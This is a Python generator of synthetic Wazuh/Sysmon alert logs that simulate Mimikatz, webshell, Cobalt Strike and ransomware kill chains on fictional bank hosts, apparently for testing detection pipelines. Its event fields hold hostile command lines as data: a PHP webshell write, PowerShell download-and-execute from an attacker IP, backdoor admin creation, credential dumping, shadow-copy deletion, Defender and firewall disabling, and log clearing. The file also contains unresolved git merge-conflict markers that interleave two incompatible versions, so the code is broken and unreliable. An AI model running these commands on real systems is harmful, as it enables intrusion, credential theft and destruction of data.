"""
EDR / Sysmon log generator — fully correlated per-incident kill chains.

Produces one JSON blob per event in Wazuh's OpenSearch format.
Each incident drives a complete scenario matched to victim_priv:

<<<<<<< HEAD
  admin   -> Mimikatz credential dump kill chain
  service -> Webshell + reverse shell kill chain
  manager -> Cobalt Strike C2 beacon kill chain
  user    -> Ransomware download + encryption kill chain

EVERY event carries:
  - data.win.eventdata.user      (BANK\\victim_user)
  - data.win.eventdata.ipAddress (attacker_ip)  <- links to other log sources
  - rule.level >= 10             <- ensures Wazuh indexes it as an alert
  - agent.name                   (victim_host short)

Baseline noise: normal process activity (low rule.level = 3-5, no attacker IP)
60/40 split is enforced by the ratio parameter.
=======
  1. FIM (syscheck) events  -> rules 550 (modified), 553 (deleted), 554 (added)
  2. Sysmon Event ID 1 (process creation) -> parent rule 61603
     + ransomware-specific commands (vssadmin Delete Shadows, etc.)
  3. VirusTotal integration -> rule 87105
     followed by Wazuh Active Response -> rule 100092 (remove-threat success)

Output is newline-delimited JSON, the shape the Wazuh agent forwards from
the Windows Security and Sysmon event channels.

NEW: victim user and host come from generators.shared_state instead of being
hardcoded. If INC-001 picked user 'svc_swift' on host 'WS-LOAN-22', the
ransomware encrypts THAT user's files on THAT host — same user/host that
appear in auth.log, AD, MSSQL, web, paloalto alerts. End-to-end correlation.

The dropper download is attributed to the scenario attacker_ip.
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
"""
import random
import json
from datetime import datetime, timedelta
from pathlib import Path
<<<<<<< HEAD
from .common import pick, rand_recent, INTERNAL_IPS, pick_normal_user, HOSTS_WS
from .shared_state import INCIDENTS

RULE_GROUPS_SYSMON = ["windows", "sysmon", "sysmon_event1"]
RULE_GROUPS_FIM    = ["windows", "sysmon", "sysmon_event11"]
RULE_GROUPS_NET    = ["windows", "sysmon", "sysmon_event3"]
RULE_GROUPS_REG    = ["windows", "sysmon", "sysmon_event13"]


def _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                rule_desc, groups, eventdata: dict) -> tuple:
    """Build a complete Wazuh-style alert JSON. Returns (ts, dict)."""
    ev = {
        "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond//1000:03d}Z",
        "agent": {"id": str(random.randint(1, 20)).zfill(3),
                  "name": victim_host_short, "ip": agent_ip},
=======
from datetime import timedelta
from .common import (
    USERNAMES, INTERNAL_IPS, ATTACKER_IPS,
    rand_recent, iso_z, pick,
)
from .shared_state import INCIDENTS


# Known ransomware family signatures we'll emulate
RANSOMWARE_FAMILIES = [
    {"name": "LockBit",   "extension": ".lockbit",
     "ransom_note": "Restore-My-Files.txt",
     "hash": "a4e7e4c2b9f8c7d6e5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2"},
    {"name": "BlackCat",  "extension": ".bc7e",
     "ransom_note": "RECOVER-FILES.txt",
     "hash": "be8e7c5a9d3f2b1a0c8e7d6f5b4a3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b"},
    {"name": "Conti",     "extension": ".conti",
     "ransom_note": "readme.txt",
     "hash": "c0f7e6d5c4b3a2918171615141312111e0d9c8b7a6f5e4d3c2b1a09f8e7d6c5b"},
    {"name": "Mamona",    "extension": ".HAes",
     "ransom_note": "README.HAes.txt",
     "hash": "d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0"},
]


def _victim_files(victim_user):
    """Files the ransomware will encrypt on the victim's machine."""
    return [
        f"C:\\Users\\{victim_user}\\Documents\\Q4_Financials.xlsx",
        f"C:\\Users\\{victim_user}\\Documents\\Budget_2026.docx",
        f"C:\\Users\\{victim_user}\\Documents\\Contract_Acme.pdf",
        f"C:\\Users\\{victim_user}\\Documents\\Tax_Returns.pdf",
        f"C:\\Users\\{victim_user}\\Desktop\\presentation.pptx",
        f"C:\\Users\\{victim_user}\\Desktop\\customer_list.csv",
        f"C:\\Users\\{victim_user}\\Pictures\\family_2024.jpg",
        f"C:\\Users\\{victim_user}\\Pictures\\vacation.png",
        f"C:\\Users\\{victim_user}\\Downloads\\report.pdf",
        f"C:\\Users\\{victim_user}\\Downloads\\meeting_notes.docx",
        f"C:\\Users\\{victim_user}\\AppData\\Local\\Mail\\backup.pst",
        "C:\\Users\\Public\\Documents\\company_handbook.pdf",
    ]


# -------- Sysmon Event ID 1 (process creation) ---------------------------
def _sysmon_process_create(ts, image, cmdline, parent_image, victim_host,
                           victim_host_short, victim_user, agent_ip):
    return {
        "timestamp": iso_z(ts),
        "agent": {"id": "002", "name": victim_host_short, "ip": agent_ip},
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
        "manager": {"name": "wazuh-manager"},
        "rule": {
            "id":    str(rule_id),
            "level": rule_level,
            "description": rule_desc,
            "groups": groups,
        },
        "data": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Sysmon",
<<<<<<< HEAD
                    "eventID": str(rule_id % 20 + 1),
                    "computer": f"{victim_host_short}.bank.local",
                    "systemTime": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond:06d}Z",
                    "eventRecordID": str(random.randint(100000, 999999)),
=======
                    "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
                    "eventID": "1",
                    "version": "5",
                    "level": "4",
                    "task": "1",
                    "opcode": "0",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer": victim_host,
                    "systemTime": iso_z(ts),
                    "eventRecordID": str(random.randint(100000, 999999)),
                    "processID": "2444",
                    "threadID": "3000",
                },
                "eventdata": {
                    "ruleName": "-",
                    "utcTime": iso_z(ts),
                    "processGuid": "{" + "-".join([
                        f"{random.randint(0, 0xffffffff):08x}",
                        f"{random.randint(0, 0xffff):04x}",
                        f"{random.randint(0, 0xffff):04x}",
                        f"{random.randint(0, 0xffff):04x}",
                        f"{random.randint(0, 0xffffffffffff):012x}",
                    ]) + "}",
                    "processId": str(random.randint(2000, 9999)),
                    "image": image,
                    "originalFileName": image.split("\\")[-1],
                    "commandLine": cmdline,
                    "currentDirectory": f"C:\\Users\\{victim_user}\\",
                    "user": f"BANK\\{victim_user}",
                    "logonGuid": "{00000000-0000-0000-0000-000000000000}",
                    "logonId": "0x" + f"{random.randint(0x10000, 0xfffff):x}",
                    "terminalSessionId": "1",
                    "integrityLevel": "High",
                    "parentProcessId": str(random.randint(1000, 1999)),
                    "parentImage": parent_image,
                    "parentCommandLine": f'"{parent_image}"',
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
                },
                "eventdata": eventdata,
            }
        },
        "location": "EventChannel",
        "decoder": {"name": "windows_eventchannel"},
    }
    return (ts, ev)


<<<<<<< HEAD
# ---------------------------------------------------------------------------
# Reusable low-level event builders (all carry victim + attacker context)
# ---------------------------------------------------------------------------
def _process_create(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
                    image, cmdline, parent_image, rule_id=100001,
                    rule_level=12, rule_desc="Suspicious process creation"):
    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                       rule_desc, RULE_GROUPS_SYSMON, {
        "user":            f"BANK\\{victim_user}",
        "ipAddress":       attacker_ip,   # <-- KEY: links to other log sources
        "image":           image,
        "commandLine":     cmdline,
        "parentImage":     parent_image,
        "processId":       str(random.randint(1000, 9999)),
        "parentProcessId": str(random.randint(1000, 9999)),
        "hashes":          "SHA256=" + "".join(random.choices("0123456789abcdef", k=64)),
    })


def _file_create(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
                 filepath, rule_id=100002, rule_level=10,
                 rule_desc="Suspicious file created"):
    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                       rule_desc, RULE_GROUPS_FIM, {
        "user":      f"BANK\\{victim_user}",
        "ipAddress": attacker_ip,
        "targetFilename": filepath,
        "creationUtcTime": ts.strftime("%Y-%m-%dT%H:%M:%S.000Z"),
    })


def _network_connect(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
                     dst_port=443, protocol="tcp",
                     rule_id=100003, rule_level=12,
                     rule_desc="Suspicious outbound network connection"):
    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                       rule_desc, RULE_GROUPS_NET, {
        "user":            f"BANK\\{victim_user}",
        "ipAddress":       attacker_ip,
        "destinationIp":   attacker_ip,
        "destinationPort": str(dst_port),
        "protocol":        protocol,
        "initiated":       "true",
    })


def _registry_set(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
                  regkey, rule_id=100004, rule_level=10,
                  rule_desc="Persistence via registry key set"):
    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                       rule_desc, RULE_GROUPS_REG, {
        "user":    f"BANK\\{victim_user}",
        "ipAddress": attacker_ip,
        "targetObject": regkey,
        "details":      "C:\\Windows\\Temp\\payload.exe",
    })


# ---------------------------------------------------------------------------
# Per-privilege kill chains
# ---------------------------------------------------------------------------
def _chain_mimikatz(base, inc, events):
    """admin victim: credential dump chain (8 events)."""
    u  = inc["victim_user"]
    h  = inc["victim_host"].split(".")[0]
    ip = inc["attacker_ip"]
    ag = "10.20.0." + str(random.randint(10, 50))
    off = 0
    for image, cmdline, rid, rlv, rdesc in [
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c powershell -enc SQBFAFgA",
         61001, 12, "Encoded PowerShell execution (LOLBIN)"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
         61002, 13, "PowerShell encoded command - credential theft"),
        ("C:\\Windows\\Temp\\mimi.exe",
         "mimi.exe sekurlsa::logonpasswords",
         61003, 15, "Mimikatz credential dump detected"),
        ("C:\\Windows\\System32\\lsass.exe",
         "lsass.exe",
         61004, 15, "LSASS memory access - credential dumping"),
        ("C:\\Windows\\System32\\net.exe",
         "net group \"Domain Admins\" /domain",
         61005, 12, "Domain admin enumeration"),
        ("C:\\Windows\\Temp\\mimi.exe",
         "mimi.exe lsadump::dcsync /user:krbtgt",
         61006, 15, "DCSync attack detected - golden ticket prep"),
    ]:
        ts = base + timedelta(seconds=off)
        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
                                       "C:\\Windows\\explorer.exe",
                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
        off += random.randint(8, 20)
    # persistence via registry run key
    ts = base + timedelta(seconds=off)
    events.append(_registry_set(ts, u, h, ag, ip,
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate",
        rule_id=61007, rule_level=12, rule_desc="Persistence via Run key"))
    # C2 callback
    ts = base + timedelta(seconds=off + 15)
    events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
        rule_id=61008, rule_level=13, rule_desc="C2 beacon outbound - post Mimikatz"))


def _chain_webshell(base, inc, events):
    """service victim: webshell + reverse shell chain (8 events)."""
    u  = inc["victim_user"]
    h  = inc["victim_host"].split(".")[0]
    ip = inc["attacker_ip"]
    ag = "10.20.2." + str(random.randint(10, 30))
    off = 0
    for image, cmdline, rid, rlv, rdesc in [
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c echo ^<?php system($_GET['cmd']); ?^> > C:\\inetpub\\wwwroot\\shell.php",
         62001, 14, "Webshell written to web root"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + ip + "/x.ps1')\"",
         62002, 14, "PowerShell downloads payload from attacker C2"),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c whoami /priv",
         62003, 11, "Post-exploitation recon via cmd.exe"),
        ("C:\\Windows\\System32\\net.exe",
         "net user backdoor Pa$$w0rd! /add",
         62004, 14, "Backdoor user account created"),
        ("C:\\Windows\\System32\\net.exe",
         "net localgroup administrators backdoor /add",
         62005, 15, "Backdoor user added to local admins"),
    ]:
        ts = base + timedelta(seconds=off)
        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
                                       "C:\\Windows\\System32\\w3wp.exe",
                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
        off += random.randint(10, 25)
    # file drop
    ts = base + timedelta(seconds=off)
    events.append(_file_create(ts, u, h, ag, ip,
        "C:\\inetpub\\wwwroot\\shell.php",
        rule_id=62006, rule_level=14, rule_desc="PHP webshell file created in web root"))
    # reverse shell network event
    ts = base + timedelta(seconds=off + 10)
    events.append(_network_connect(ts, u, h, ag, ip, dst_port=4444,
        rule_id=62007, rule_level=15, rule_desc="Reverse shell outbound connection"))
    # ransomware encryption starts
    ts = base + timedelta(seconds=off + 20)
    events.append(_file_create(ts, u, h, ag, ip,
        "C:\\Users\\Public\\DECRYPT_INSTRUCTIONS.txt",
        rule_id=62008, rule_level=15, rule_desc="Ransomware ransom note created"))


def _chain_cobalt_strike(base, inc, events):
    """manager victim: Cobalt Strike C2 beacon chain (8 events)."""
    u  = inc["victim_user"]
    h  = inc["victim_host"].split(".")[0]
    ip = inc["attacker_ip"]
    ag = "10.10." + str(random.randint(1, 5)) + "." + str(random.randint(10, 250))
    off = 0
    for image, cmdline, rid, rlv, rdesc in [
        ("C:\\Users\\" + u + "\\AppData\\Local\\Temp\\invoice.exe",
         "invoice.exe",
         63001, 12, "Suspicious executable from Downloads/Temp"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -w hidden -c \"$c=New-Object System.Net.WebClient;$c.DownloadFile('http://" + ip + "/beacon.exe','C:\\Windows\\Temp\\svchost32.exe')\"",
         63002, 14, "Cobalt Strike stager download"),
        ("C:\\Windows\\Temp\\svchost32.exe",
         "svchost32.exe -pipe",
         63003, 15, "Cobalt Strike beacon process"),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c ipconfig /all && net view && arp -a",
         63004, 11, "Network reconnaissance commands"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -c \"Invoke-Mimikatz -DumpCreds\"",
         63005, 15, "In-memory credential dumping"),
    ]:
        ts = base + timedelta(seconds=off)
        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
                                       "C:\\Windows\\explorer.exe",
                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
        off += random.randint(15, 30)
    # repeated C2 beacons (3 network events = signature of beacon interval)
    for i in range(3):
        ts = base + timedelta(seconds=off + i * 60)
        events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
            rule_id=63006, rule_level=13,
            rule_desc=f"Cobalt Strike beacon #{i+1} - periodic C2 callback"))


def _chain_ransomware(base, inc, events):
    """user victim: drive-by download + ransomware chain (8 events)."""
    u  = inc["victim_user"]
    h  = inc["victim_host"].split(".")[0]
    ip = inc["attacker_ip"]
    ag = "10.10." + str(random.randint(6, 15)) + "." + str(random.randint(10, 250))
    off = 0
    for image, cmdline, rid, rlv, rdesc in [
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
         f"chrome.exe --download-url=http://{ip}/invoice_{random.randint(1000,9999)}.exe",
         64001, 10, "Browser downloads suspicious executable"),
        ("C:\\Users\\" + u + "\\Downloads\\invoice.exe",
         "invoice.exe /silent",
         64002, 13, "Suspicious executable launched from Downloads"),
        ("C:\\Windows\\System32\\vssadmin.exe",
         "vssadmin delete shadows /all /quiet",
         64003, 15, "VSS shadow copy deletion - ransomware pre-encryption"),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c wmic shadowcopy delete",
         64004, 15, "WMI shadow copy deletion"),
        ("C:\\Users\\" + u + "\\Downloads\\invoice.exe",
         "invoice.exe --encrypt C:\\Users --key xor",
         64005, 15, "Ransomware file encryption process"),
    ]:
        ts = base + timedelta(seconds=off)
        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
                                       "C:\\Windows\\explorer.exe",
                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
        off += random.randint(10, 20)
    # C2 registration
    ts = base + timedelta(seconds=off)
    events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
        rule_id=64006, rule_level=14, rule_desc="Ransomware C2 registration"))
    # ransom note dropped
    ts = base + timedelta(seconds=off + 5)
    events.append(_file_create(ts, u, h, ag, ip,
        "C:\\Users\\Public\\Desktop\\YOUR_FILES_ARE_ENCRYPTED.txt",
        rule_id=64007, rule_level=15, rule_desc="Ransomware ransom note dropped"))
    # ongoing encryption file activity
    ts = base + timedelta(seconds=off + 10)
    events.append(_file_create(ts, u, h, ag, ip,
        f"C:\\Users\\{u}\\Documents\\accounts.xlsx.locked",
        rule_id=64008, rule_level=15, rule_desc="Ransomware file encryption activity"))


CHAIN_BY_PRIV = {
    "admin":   _chain_mimikatz,
    "service": _chain_webshell,
    "manager": _chain_cobalt_strike,
    "user":    _chain_ransomware,
    "vendor":  _chain_webshell,    # vendors treated like service compromise
}


# ---------------------------------------------------------------------------
# Baseline noise events (low rule.level, no attacker IP, normal users)
# ---------------------------------------------------------------------------
def _baseline_events(count, events):
    normal_procs = [
        ("C:\\Windows\\System32\\svchost.exe",   "svchost.exe -k netsvcs",      3, "Normal service host process"),
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                                                  "chrome.exe",                  3, "Browser process"),
        ("C:\\Windows\\System32\\WindowsUpdateClient\\wuauclt.exe",
                                                  "wuauclt.exe /runhandler",      4, "Windows Update client"),
        ("C:\\Windows\\System32\\msiexec.exe",    "msiexec.exe /quiet /i app.msi",5,"Software installation"),
        ("C:\\Windows\\explorer.exe",             "explorer.exe",                 3, "Explorer normal"),
        ("C:\\Windows\\System32\\taskhostw.exe",  "taskhostw.exe",               3, "Task host normal"),
        ("C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                                                  "WINWORD.EXE /r",              3, "Word document opened"),
        ("C:\\Windows\\System32\\cmd.exe",        "cmd.exe /c ipconfig",         4, "Admin checking IP config"),
    ]
    for _ in range(count):
        ts = rand_recent(60)
        image, cmdline, rlv, rdesc = pick(normal_procs)
        user = pick_normal_user()
        host = pick(HOSTS_WS).split(".")[0]
        agent_ip = "10.10." + str(random.randint(1, 15)) + "." + str(random.randint(10, 250))
        ev = _make_event(ts, host, agent_ip,
                         100 + random.randint(0, 50), rlv, rdesc,
                         RULE_GROUPS_SYSMON, {
            "user":      f"BANK\\{user['username']}",
            "image":     image,
            "commandLine": cmdline,
            "parentImage": "C:\\Windows\\System32\\services.exe",
        })
        events.append(ev)


# ---------------------------------------------------------------------------
# Main generator
# ---------------------------------------------------------------------------
def generate(output_path, count: int = 60, normal_ratio: float = 0.60) -> None:
    all_events = []
    scenarios_used = []

    # ---- Attack chains (incident-driven) ----
    for inc in INCIDENTS:
        priv   = inc.get("victim_priv", "user")
        chain  = CHAIN_BY_PRIV.get(priv, _chain_ransomware)
        base   = rand_recent(30)
        chain(base, inc, all_events)
        scenarios_used.append(
            f"{priv:<10} {chain.__name__:<25} {inc['attacker_ip']:>16} "
            f"-> {inc['victim_user']}@{inc['victim_host'].split('.')[0]}")

    attack_count = len(all_events)
=======
# -------- FIM (syscheck) events ------------------------------------------
def _fim_event(ts, path, event_type, victim_host_short, agent_ip, sha256=None):
    sha256 = sha256 or "".join(random.choices("0123456789abcdef", k=64))
    return {
        "timestamp": iso_z(ts),
        "agent": {"id": "002", "name": victim_host_short, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "syscheck": {
            "path": path,
            "mode": "realtime",
            "event": event_type,
            "size_after": str(random.randint(10000, 5000000)),
            "perm_after": "rw-rw-rw-",
            "uid_after": "S-1-5-21-1004336348-1177238915-682003330-1234",
            "gid_after": "0",
            "md5_after": "".join(random.choices("0123456789abcdef", k=32)),
            "sha1_after": "".join(random.choices("0123456789abcdef", k=40)),
            "sha256_after": sha256,
            "mtime_after": iso_z(ts),
            "changed_attributes": ["size", "mtime", "md5", "sha1", "sha256"],
        },
        "rule": {
            "level": 7 if event_type == "modified" else 5,
            "description": {
                "added":    "File added to the system.",
                "modified": "Integrity checksum changed.",
                "deleted":  "File deleted.",
            }[event_type],
            "id": {"added": "554", "modified": "550", "deleted": "553"}[event_type],
            "mitre": {
                "id":      ["T1486"],
                "tactic":  ["Impact"],
                "technique": ["Data Encrypted for Impact"],
            },
            "groups": ["ossec", "syscheck", f"syscheck_entry_{event_type}",
                       "syscheck_file"],
        },
        "decoder": {"name": "syscheck_event"},
        "location": "syscheck",
    }


# -------- VirusTotal integration alert -----------------------------------
def _virustotal_alert(ts, file_path, sha256, family, victim_host_short,
                      agent_ip):
    return {
        "timestamp": iso_z(ts),
        "agent": {"id": "002", "name": victim_host_short, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "integration": "virustotal",
        "virustotal": {
            "found": 1,
            "malicious": 1,
            "source": {
                "alert_id": f"{int(ts.timestamp())}.{random.randint(100000, 999999)}",
                "file": file_path,
                "md5":    "".join(random.choices("0123456789abcdef", k=32)),
                "sha1":   "".join(random.choices("0123456789abcdef", k=40)),
                "sha256": sha256,
            },
            "sha1":      "".join(random.choices("0123456789abcdef", k=40)),
            "scan_date": iso_z(ts),
            "positives": str(random.randint(45, 68)),
            "total":     "72",
            "permalink": f"https://www.virustotal.com/gui/file/{sha256}/detection",
            "malicious": 1,
        },
        "rule": {
            "level": 12,
            "description": (f"VirusTotal: Alert - {file_path} - "
                            f"{random.randint(45, 68)} engines detected this file "
                            f"({family})"),
            "id": "87105",
            "mitre": {
                "id":        ["T1203"],
                "tactic":    ["Execution"],
                "technique": ["Exploitation for Client Execution"],
            },
            "groups": ["virustotal"],
        },
        "decoder": {"name": "json"},
        "location": "virustotal",
    }


# -------- Active Response (file removed) ---------------------------------
def _active_response(ts, file_path, victim_host_short, agent_ip):
    return {
        "timestamp": iso_z(ts),
        "agent": {"id": "002", "name": victim_host_short, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "data": {
            "command": "remove-threat.exe",
            "parameters": {
                "extra_args": [],
                "alert": {"data": {"virustotal": {"source": {"file": file_path}}}},
                "program": "remove-threat.exe",
            },
            "status": "SUCCESS",
        },
        "rule": {
            "level": 7,
            "description": (f"Active response: Successfully removed threat "
                            f"located at {file_path}"),
            "id": "100092",
            "groups": ["active_response", "ransomware"],
        },
        "decoder": {"name": "json"},
        "location": "active-response",
    }


# -------- High-level scenario assembly -----------------------------------
def _ransomware_scenario(start_ts, family, victim_user, victim_host,
                         attacker_ip):
    """Build a full ransomware kill-chain for ONE infected machine."""
    victim_host_short = victim_host.split(".")[0]
    agent_ip = f"10.1.{random.randint(200, 250)}.{random.randint(10, 250)}"
    events = []
    files = _victim_files(victim_user)

    # --- Initial dropper (browser writes EXE; download from attacker_ip) ---
    exe_path = (f"C:\\Users\\{victim_user}\\Downloads\\"
                f"invoice_{random.randint(1000, 9999)}.exe")
    ts = start_ts
    events.append((ts, _sysmon_process_create(
        ts,
        image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        cmdline=f'"chrome.exe" --download-url=http://{attacker_ip}/invoice.exe',
        parent_image="C:\\Windows\\explorer.exe",
        victim_host=victim_host,
        victim_host_short=victim_host_short,
        victim_user=victim_user,
        agent_ip=agent_ip,
    )))

    ts = start_ts + timedelta(seconds=5)
    events.append((ts, _fim_event(
        ts, exe_path, "added", victim_host_short, agent_ip,
        sha256=family["hash"])))

    ts = start_ts + timedelta(seconds=8)
    events.append((ts, _virustotal_alert(
        ts, exe_path, family["hash"], family["name"],
        victim_host_short, agent_ip)))

    ts = start_ts + timedelta(seconds=10)
    events.append((ts, _active_response(
        ts, exe_path, victim_host_short, agent_ip)))

    # --- AR fails / hash unknown: ransomware runs ----------------------
    ransom_exe = (f"C:\\Users\\{victim_user}\\AppData\\Local\\Temp\\"
                  f"{family['name'].lower()}.exe")

    ts = start_ts + timedelta(seconds=20)
    events.append((ts, _sysmon_process_create(
        ts, image=ransom_exe,
        cmdline=f'"{ransom_exe}" -encrypt -path C:\\Users\\{victim_user}',
        parent_image="C:\\Windows\\explorer.exe",
        victim_host=victim_host, victim_host_short=victim_host_short,
        victim_user=victim_user, agent_ip=agent_ip,
    )))

    # T1490 Inhibit Recovery
    for sec, image, cmdline in [
        (30, "C:\\Windows\\System32\\vssadmin.exe",
         "vssadmin.exe Delete Shadows /All /Quiet"),
        (35, "C:\\Windows\\System32\\wbadmin.exe",
         "wbadmin.exe delete catalog -quiet"),
        (40, "C:\\Windows\\System32\\bcdedit.exe",
         "bcdedit.exe /set {default} recoveryenabled No"),
        (45, "C:\\Windows\\System32\\wbem\\WMIC.exe",
         "wmic.exe shadowcopy delete"),
        (50, "C:\\Windows\\System32\\reg.exe",
         'reg.exe add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" '
         '/v DisableAntiSpyware /t REG_DWORD /d 1 /f'),
        (55, "C:\\Windows\\System32\\netsh.exe",
         "netsh.exe advfirewall set currentprofile state off"),
    ]:
        ts = start_ts + timedelta(seconds=sec)
        events.append((ts, _sysmon_process_create(
            ts, image=image, cmdline=cmdline, parent_image=ransom_exe,
            victim_host=victim_host, victim_host_short=victim_host_short,
            victim_user=victim_user, agent_ip=agent_ip)))

    # --- Mass file encryption ----------------------------------------
    for i, vfile in enumerate(files):
        ts_mod = start_ts + timedelta(seconds=60 + i * 2)
        events.append((ts_mod, _fim_event(
            ts_mod, vfile, "modified", victim_host_short, agent_ip)))
        ts_add = start_ts + timedelta(seconds=61 + i * 2)
        events.append((ts_add, _fim_event(
            ts_add, vfile + family["extension"], "added",
            victim_host_short, agent_ip)))
        ts_del = start_ts + timedelta(seconds=62 + i * 2)
        events.append((ts_del, _fim_event(
            ts_del, vfile, "deleted", victim_host_short, agent_ip)))

    # --- Ransom notes dropped in every monitored directory ------------
    note_dirs = [
        f"C:\\Users\\{victim_user}\\Documents",
        f"C:\\Users\\{victim_user}\\Desktop",
        f"C:\\Users\\{victim_user}\\Pictures",
        f"C:\\Users\\{victim_user}\\Downloads",
        "C:\\Users\\Public\\Documents",
    ]
    for i, d in enumerate(note_dirs):
        ts_note = start_ts + timedelta(seconds=180 + i * 2)
        events.append((ts_note, _fim_event(
            ts_note, f"{d}\\{family['ransom_note']}", "added",
            victim_host_short, agent_ip)))

    # --- Clear Windows event logs (cover tracks) ----------------------
    ts = start_ts + timedelta(seconds=200)
    events.append((ts, _sysmon_process_create(
        ts, image="C:\\Windows\\System32\\wevtutil.exe",
        cmdline="wevtutil.exe cl Security",
        parent_image=ransom_exe,
        victim_host=victim_host, victim_host_short=victim_host_short,
        victim_user=victim_user, agent_ip=agent_ip)))

    return events


def generate(path: Path, count: int = 1) -> None:
    """
    Each incident in shared_state.INCIDENTS that has a "compromisable" victim
    gets one ransomware kill-chain. `count` is kept for legacy compatibility
    but the actual number of scenarios = number of incidents.

    If for some reason there are no eligible incidents, fall back to a single
    random ransomware burst so the file is non-empty.
    """
    all_events = []
    eligible = [inc for inc in INCIDENTS
                if inc["victim_priv"] in ("admin", "manager", "service", "user")]

    if not eligible:
        # Shouldn't happen in practice — fallback
        eligible = INCIDENTS or [{
            "victim_user": "alopez",
            "victim_host": "WS-FIN-04.bank.local",
            "attacker_ip": pick(ATTACKER_IPS),
        }]

    families_used = []
    for inc in eligible:
        family = pick(RANSOMWARE_FAMILIES)
        families_used.append(f"{family['name']} -> {inc['victim_user']}@"
                             f"{inc['victim_host'].split('.')[0]}")
        scenario_start = rand_recent(60)
        all_events.extend(_ransomware_scenario(
            scenario_start, family,
            victim_user=inc["victim_user"],
            victim_host=inc["victim_host"],
            attacker_ip=inc["attacker_ip"]))
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47

    # ---- Baseline (60% of total by default) ----
    # total = attack / (1 - ratio)  →  baseline = total - attack
    total_target  = int(attack_count / (1 - normal_ratio))
    baseline_need = total_target - attack_count
    _baseline_events(max(baseline_need, count), all_events)

    # Sort and write
    all_events.sort(key=lambda x: x[0])
<<<<<<< HEAD
    with open(output_path, "w") as f:
        for ts, ev in all_events:
            f.write(json.dumps(ev) + "\n")

    total = len(all_events)
    print(f"  wrote {total} EDR events -> {Path(output_path).name}")
    print(f"  attack events:   {attack_count} ({attack_count/total*100:.0f}%)")
    print(f"  baseline events: {total-attack_count} ({(total-attack_count)/total*100:.0f}%)")
    print(f"  correlated kill-chains: {len(scenarios_used)}")
    for s in scenarios_used:
        print(f"    {s}")
=======
    with path.open("w", encoding="utf-8") as f:
        for _, ev in all_events:
            f.write(json.dumps(ev, separators=(",", ":")) + "\n")

    print(f"  wrote {len(all_events)} EDR/ransomware events across "
          f"{len(eligible)} infected machine(s) -> {path.name}")
    for fam in families_used:
        print(f"    {fam}")
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
